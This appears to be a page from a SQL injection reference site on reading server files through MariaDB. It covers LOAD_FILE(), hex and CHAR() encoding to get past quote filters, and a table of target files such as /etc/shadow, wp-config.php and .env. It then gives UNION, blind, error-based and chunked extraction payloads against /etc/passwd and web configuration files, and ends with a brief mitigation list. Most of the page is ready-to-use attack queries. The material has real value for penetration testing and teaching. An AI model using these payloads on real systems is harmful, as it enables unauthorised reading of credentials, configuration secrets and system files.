---
title: Reading Files
description: Techniques for reading files from the filesystem using MariaDB
category: File Operations
order: 15
tags: ["file operations", "load_file", "privilege escalation"]
lastUpdated: 2025-12-18
---

## Reading Files

MariaDB provides functionality to read files from the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.

### Prerequisites

To read files from the MariaDB server, the following conditions must be met:

1. The MariaDB user must have the `FILE` privilege
2. The file must be readable by the MariaDB server process (usually `mysql` user)
3. You must know the absolute path to the file
4. The file size must be less than `max_allowed_packet`
5. The `secure_file_priv` setting must allow access

```sql
-- Check FILE privilege
SELECT COUNT(*) FROM information_schema.user_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
AND privilege_type = 'FILE'

-- Check secure_file_priv setting
SELECT @@secure_file_priv AS secure_file_priv
-- NULL = disabled, '' = any path, '/path/' = restricted

-- Check max_allowed_packet (file size limit)
SELECT @@max_allowed_packet AS max_size
-- Default is typically 16MB in MariaDB
```

### LOAD_FILE() Function

The primary method for reading files is the `LOAD_FILE()` function:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

This function returns the file contents as a string or NULL if the file doesn't exist or isn't readable.

#### Hex Encoding to Bypass Filters

Use hex encoding to avoid quote filters:

```sql
-- '/etc/passwd' in hex
SELECT LOAD_FILE(0x2F6574632F706173737764)

-- '/etc/my.cnf' in hex
SELECT LOAD_FILE(0x2F6574632F6D792E636E66)

-- '/etc/hosts' in hex
SELECT LOAD_FILE(0x2F6574632F686F737473)

-- Generate hex path dynamically
SELECT HEX('/etc/passwd') AS hex_path
-- Returns: 2F6574632F706173737764
```

#### CHAR() Function for Path Construction

Build paths character by character to bypass filters:

```sql
-- '/' = CHAR(47), 'e' = CHAR(101), 't' = CHAR(116), 'c' = CHAR(99)
SELECT LOAD_FILE(CONCAT(CHAR(47), 'etc', CHAR(47), 'passwd'))

-- Full path using CHAR()
SELECT LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100))
-- Builds: /etc/passwd
```

> **Note:** See [Privileges](/mariadb/privileges) for detailed FILE privilege checking queries.

### Important Target Files

Common valuable files to read:

| File Path                            | Description                                |
| ------------------------------------ | ------------------------------------------ |
| `/etc/passwd`                        | System users list                          |
| `/etc/shadow`                        | Password hashes (rarely readable)          |
| `/etc/hosts`                         | Host mapping information                   |
| `/proc/self/environ`                 | Environment variables                      |
| `/etc/my.cnf` or `/etc/mysql/my.cnf` | MariaDB configuration                      |
| `/var/lib/mysql-files/`              | MariaDB secure file priv directory         |
| `/var/www/html/config.php`           | Web application configuration              |
| `/var/www/html/wp-config.php`        | WordPress configuration                    |
| `/var/www/html/.env`                 | Environment variables for web applications |
| `/home/user/.bash_history`           | Command history                            |
| `/var/log/apache2/access.log`        | Web server access logs                     |
| `/var/log/mysql/error.log`           | MariaDB error logs                         |
| `/proc/version`                      | Kernel version information                 |

### Advanced Techniques

#### Reading Binary Files

Binary files can be read and converted to hexadecimal or Base64:

```sql
-- Convert to hex for safe transmission
SELECT HEX(LOAD_FILE('/bin/ls'))

-- Convert to Base64 for encoding
SELECT TO_BASE64(LOAD_FILE('/etc/passwd')) AS b64_content

-- Get file length
SELECT LENGTH(LOAD_FILE('/etc/passwd')) AS file_size
```

#### Determining Web Root Path

If you don't know the web server's document root:

```sql
-- Try common locations
SELECT LOAD_FILE('/var/www/html/index.php');
SELECT LOAD_FILE('/srv/www/index.php');
SELECT LOAD_FILE('/usr/share/nginx/html/index.php');

-- Or check configuration files
SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf');
SELECT LOAD_FILE('/etc/nginx/sites-enabled/default');

-- Systematically detect web root using CASE statement
SELECT
  CASE
    WHEN LOAD_FILE('/var/www/html/index.php') IS NOT NULL THEN '/var/www/html/'
    WHEN LOAD_FILE('/srv/www/index.php') IS NOT NULL THEN '/srv/www/'
    WHEN LOAD_FILE('/usr/share/nginx/html/index.php') IS NOT NULL THEN '/usr/share/nginx/html/'
    ELSE 'unknown'
  END AS webroot
-- Returns the first matching web root path or 'unknown'
```

#### Dealing with Unknown File Paths

If exact path is unknown, try multiple possible locations using CONCAT:

```sql
SELECT LOAD_FILE(CONCAT('/var/www/', 'config.php'));
SELECT LOAD_FILE(CONCAT('/var/www/html/', 'config.php'));
SELECT LOAD_FILE(CONCAT('/var/www/site/', 'config.php'));

-- Try multiple web roots
SELECT COALESCE(
    LOAD_FILE('/var/www/html/config.php'),
    LOAD_FILE('/srv/www/config.php'),
    LOAD_FILE('/home/www/config.php')
) AS config_contents;
```

#### Reading System Information

```sql
-- Get /etc/passwd to identify users
SELECT LOAD_FILE('/etc/passwd');

-- Check MariaDB configuration
SELECT LOAD_FILE('/etc/my.cnf');

-- Read kernel version
SELECT LOAD_FILE('/proc/version');

-- Check network configuration
SELECT LOAD_FILE('/etc/resolv.conf');
```

### Practical Examples

#### Reading Database Configuration

```sql
-- Check for common configuration files
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/var/www/html/wp-config.php');
SELECT LOAD_FILE('/var/www/html/configuration.php');   -- Joomla
SELECT LOAD_FILE('/var/www/html/sites/default/settings.php');  -- Drupal
```

### Injection Context Examples

#### UNION-Based File Reading

```sql
-- Extract file content via UNION injection
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, LOAD_FILE('/etc/passwd')

-- With hex-encoded path
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, LOAD_FILE(0x2F6574632F686F737473)
```

#### Subquery-Based Extraction

```sql
-- File content as subquery
SELECT (SELECT LOAD_FILE('/etc/passwd')) AS content

-- File existence check
SELECT IF(LOAD_FILE('/etc/passwd') IS NOT NULL, 'exists', 'not_found') AS result
```

### Boolean-Based Detection

For blind injection when direct output isn't visible:

```sql
-- Check if file exists and is readable
SELECT IF(LENGTH(LOAD_FILE('/etc/passwd')) > 0, 1, 0) AS has_content

-- Check if file contains specific string
SELECT IF(LOAD_FILE('/etc/passwd') LIKE '%root%', 1, 0) AS contains_root

-- Extract character by character
SELECT ASCII(SUBSTRING(LOAD_FILE('/etc/passwd'), 1, 1)) AS first_char
-- Returns 114 for 'r' (first char of 'root')

-- Binary search for character values (efficient for blind extraction)
SELECT IF(ASCII(SUBSTRING(LOAD_FILE('/etc/passwd'), 1, 1)) > 100, 1, 0) AS is_above_100
-- Returns 1 if first character ASCII value > 100, 0 otherwise
-- Allows narrowing down character values in log2(256) = 8 queries
```

### System Variables for Path Discovery

MariaDB provides system variables that reveal useful paths:

```sql
-- MariaDB data directory (database files)
SELECT @@datadir AS datadir
-- Example: /var/lib/mysql/

-- MariaDB installation directory
SELECT @@basedir AS basedir
-- Example: /usr/

-- Temporary directory
SELECT @@tmpdir AS tmpdir
-- Example: /tmp

-- Error log path
SELECT @@log_error AS error_log

-- Binary log base path (if enabled)
SELECT @@log_bin_basename AS binlog_base

-- Construct path to user data file
SELECT CONCAT(@@datadir, 'mysql/user.MYD') AS user_data_file
```

### LOAD DATA INFILE Alternative

An alternative to `LOAD_FILE()` that loads file content into a table:

```sql
-- Create temporary table for file content
CREATE TEMPORARY TABLE temp_file (line TEXT)

-- Load file into table (requires FILE privilege)
LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_file

-- Read content
SELECT * FROM temp_file

-- Clean up
DROP TEMPORARY TABLE temp_file
```

#### LOAD DATA LOCAL INFILE

Reads files from the client machine instead of the server:

```sql
-- Load from client (may be disabled for security)
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE temp_file
```

**Note:** `LOCAL` variant is often disabled via `local_infile` setting.

### Error-Based File Extraction

Extract file content through error messages:

```sql
-- Using EXTRACTVALUE (content appears in error)
SELECT EXTRACTVALUE(1, CONCAT(0x7e, LOAD_FILE('/etc/passwd'), 0x7e))

-- Using UPDATEXML with substring (for large files)
SELECT UPDATEXML(1, CONCAT(0x7e, SUBSTRING(LOAD_FILE('/etc/passwd'), 1, 30), 0x7e), 1)

-- Extract specific portions
SELECT UPDATEXML(1, CONCAT(0x7e, SUBSTRING(LOAD_FILE('/etc/passwd'), 31, 30), 0x7e), 1)
```

### File Size Limitations

```sql
-- Check maximum file size that can be read
SELECT @@max_allowed_packet AS max_file_size
-- Typically 16MB in MariaDB

-- Check actual file size before reading
SELECT LENGTH(LOAD_FILE('/var/log/mysql/error.log')) AS file_size

-- For large files, read in chunks
SELECT SUBSTRING(LOAD_FILE('/var/log/mysql/error.log'), 1, 10000) AS chunk1
SELECT SUBSTRING(LOAD_FILE('/var/log/mysql/error.log'), 10001, 10000) AS chunk2
SELECT SUBSTRING(LOAD_FILE('/var/log/mysql/error.log'), 20001, 10000) AS chunk3

-- Dynamic chunking approach
-- First, get total file size
SELECT LENGTH(LOAD_FILE('/etc/passwd')) AS total_size

-- Then extract in 1000-byte chunks
SELECT SUBSTRING(LOAD_FILE('/etc/passwd'), 1, 1000) AS chunk_1
SELECT SUBSTRING(LOAD_FILE('/etc/passwd'), 1001, 1000) AS chunk_2
-- Continue until total_size is reached
```

### Security Considerations

The `FILE` privilege has important characteristics:

- **Global only**: Cannot be granted at database or table level
- **Covers both read and write**: Same privilege for `LOAD_FILE()` and `INTO OUTFILE`
- **secure_file_priv**: Restricts file operations to specific directory

```sql
-- Check if FILE privilege is global
SELECT privilege_type FROM information_schema.user_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
AND privilege_type = 'FILE'
```

### Mitigation

To prevent unauthorized file access:

1. Limit FILE privilege to trusted users only
2. Set `secure_file_priv` to restrict file operations to a specific directory
3. Use prepared statements in application code
4. Implement proper input validation
5. Run MariaDB with minimum necessary privileges
